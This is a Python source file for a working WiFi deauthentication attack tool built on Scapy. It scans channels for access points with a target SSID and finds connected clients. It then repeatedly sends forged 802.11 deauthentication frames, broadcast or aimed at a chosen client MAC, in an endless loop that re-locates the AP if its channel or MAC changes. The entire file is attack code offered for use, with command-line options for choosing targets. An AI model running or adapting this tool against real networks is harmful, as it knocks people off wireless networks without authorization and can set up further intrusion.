
import argparse, os, time, sys
from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, Dot11QoS, Dot11Deauth, Dot11
from scapy.all import *

class WiFiDeauth():
    def __init__(self,
                 ssid,
                 interface,
                 discovery_timeout=2,
                 checking_timeout=2,
                 attacks_before_check=9,
                 inbetween_packets_sleep=0.1,
                 band_a_channels=[],
                 band_b_channels=[],
                 client_mac = None
                 ):
        self.ssid = ssid
        self.interface = interface
        self.discovery_timeout = discovery_timeout
        self.checking_timeout = checking_timeout
        self.attacks_before_check = attacks_before_check
        self.inbetween_packets_sleep = inbetween_packets_sleep
        self.band_a_channels = band_a_channels
        self.band_b_channels = band_b_channels
        self.client_mac = client_mac
        self.aps = []
        self.clients = []
        self._existing_aps = []
        self._current_ap_mac = None

    def packet_confirms_client(self, pkt):
            return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
                (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
                pkt.haslayer(Dot11QoS)

    def frequency_to_channel(self, freq: int) -> int:
        base = 5000 if freq // 1000 == 5 else 2407
        return (freq - base) // 5

    def set_channel(self, ch_num):
            os.system(f"iw dev {self.interface} set channel {ch_num}")

    def get_channels(self) -> List[int]:
            channels = [int(channel.split('Channel')[1].split(':')[0].strip())
                    for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                    if 'Channel' in channel and 'Current' not in channel]
            if not self.band_a_channels and not self.band_b_channels:
                return channels
            for idx, ch in enumerate(channels):
                if ch > 14:
                    first_a_ch_idx = idx
                    break
            prev_b_ch = channels[:first_a_ch_idx]
            prev_a_ch = channels[first_a_ch_idx:]
            result = []
            result += self.band_b_channels if self.band_b_channels else prev_b_ch
            result += self.band_a_channels if self.band_a_channels else prev_a_ch
            return result

    def _clients_sniff_cb(self, pkt):
        try:
            if self.packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                c_mac = pkt.addr1
                print(f"found CLIENT: {c_mac} connected to {ap_mac}")
                c_ap = {"c_mac": c_mac, "ap_mac": ap_mac}
                if not c_ap in self.clients:
                    self.clients.append(c_ap)
        except:
            pass

    def _ap_sniff_cb(self, pkt):
            try:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    ap_mac = str(pkt.addr3)
                    ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                    pkt_ch = self.frequency_to_channel(pkt[RadioTap].Channel)
                    band_type = "5Ghz" if pkt_ch > 14 else "2.4Ghz"
                    ap = {"mac": ap_mac, "ch": pkt_ch, "ssid": ssid, "band": band_type}
                    if not ap in self.aps:
                        self.aps.append(ap)
                else:
                    if self.client_mac:
                        self._clients_sniff_cb(pkt)  # pass forward to find potential clients
            except Exception as e:
                print(e)

    def sniff_for_aps(self):
        self.aps = []
        self.clients = []
        channels = self.get_channels()
        for channel in channels:
            self.set_channel(channel)
            sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self.discovery_timeout)
            print(f"Scanning for APs: {((channels.index(channel)/len(channels)*100)):.2f}%", end="\r")
            sys.stdout.flush()
        print("")

    def send_deauth_broadcast(self, ap_mac: str):
        sendp(RadioTap() /
            Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7),
            iface=self.interface,
            verbose=False)
        
    def send_deauth_client(self, ap_mac: str, client_mac: str):
        sendp(RadioTap() /
            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7),
            iface=self.interface,
            verbose=False)
        sendp(RadioTap() /
            Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
            Dot11Deauth(reason=7),
            iface=self.interface,
            verbose=False)
    
    def _exists_cb(self, pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            ap_mac = str(pkt.addr3)
            pkt_ch = self.frequency_to_channel(pkt[RadioTap].Channel)
            ap = (ap_mac, pkt_ch)
            if not ap in self._existing_aps and ap[0] == self._current_ap_mac:
                self._existing_aps.append(ap)
        
    def check_existing(self, APs: List[Tuple[str, int]]):
        self._existing_aps = []
        for mac, ch in APs:
            self.set_channel(ch)
            self._current_ap_mac = mac 
            sniff(prn = self._exists_cb, iface=self.interface, timeout=self.checking_timeout)
        for mac_ch in APs:
            if mac_ch not in self._existing_aps:
                return False
        if len(APs) != len(self._existing_aps):
            return False
        return True

    def deauth_loop(self):
        while True:
            ap_found = []
            while not ap_found:
                for ap in self.aps:
                    if ap["ssid"] == self.ssid:
                        ap_found.append(ap)
                if ap_found:
                    break
                print("AP NOT FOUND IN DISCOVERED APs! Sniffing again...")
                self.sniff_for_aps()
            
            ap_ch_list = [(ap["mac"], ap["ch"]) for ap in ap_found]
            while True:
                for _ in range(self.attacks_before_check):
                    for ap in ap_found:
                        ch = ap["ch"]
                        band = ap["band"]
                        mac = ap["mac"]
                        print(f"Sending broadcast deauth to {self.ssid} {ch} {band}...     ", end="\r")
                        sys.stdout.flush()
                        self.set_channel(ch)
                        if not self.client_mac or self.client_mac not in map(lambda c: c["c_mac"], self.clients):
                            self.send_deauth_broadcast(ap_mac=mac)
                        else:
                            self.send_deauth_client(ap_mac=mac, client_mac=self.client_mac)
                    time.sleep(self.inbetween_packets_sleep)
                if not self.check_existing(ap_ch_list):
                    print("THE AP HAS CHANGED HIS MAC OR ITS CHANNELS. Sniffing again...")
                    self.sniff_for_aps()
                    break

def main():
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Tool")

    parser.add_argument("-a", "--ap_ssid", required=True, help="Target SSID")
    parser.add_argument("-i", "--interface", required=True, help="Monitor mode interface")
    parser.add_argument("-d", "--discovery-timeout", type=float, default=2.0,
                        help="Sniff timeout per channel (default: 2.0)")
    parser.add_argument("-c", "--client-mac", default=None,
                        help="Specific client MAC to target (optional)")
    parser.add_argument("-A", "--attacks-before-check", type=int, default=18,
                        help="Number of deauth bursts before checking AP existence (default: 18)")
    parser.add_argument("-I", "--inbetween-packets-sleep", type=float, default=0.1,
                        help="Sleep time between attack bursts (default: 0.1)")
    parser.add_argument("-bA", "--band-a-channels", type=int, nargs="*", default=[],
                        help="5GHz channels to include (space separated list)")
    parser.add_argument("-bB", "--band-b-channels", type=int, nargs="*", default=[],
                        help="2.4GHz channels to include (space separated list)")
    parser.add_argument("-C", "--checking-timeout", type=float, default=2.0,
                        help="Sniff timeout per channel while checking for changes (default: 2.0)")

    args = parser.parse_args()

    try:
        deauth = WiFiDeauth(
            ssid=args.ap_ssid,
            interface=args.interface,
            discovery_timeout=args.discovery_timeout,
            checking_timeout=args.checking_timeout,
            attacks_before_check=args.attacks_before_check,
            inbetween_packets_sleep=args.inbetween_packets_sleep,
            band_a_channels=args.band_a_channels,
            band_b_channels=args.band_b_channels,
            client_mac=args.client_mac
        )

        deauth.sniff_for_aps()
        deauth.deauth_loop()

    except KeyboardInterrupt:
        return 0
    except Exception as e:
        print(e)
        return 1

if __name__ == "__main__":
    main()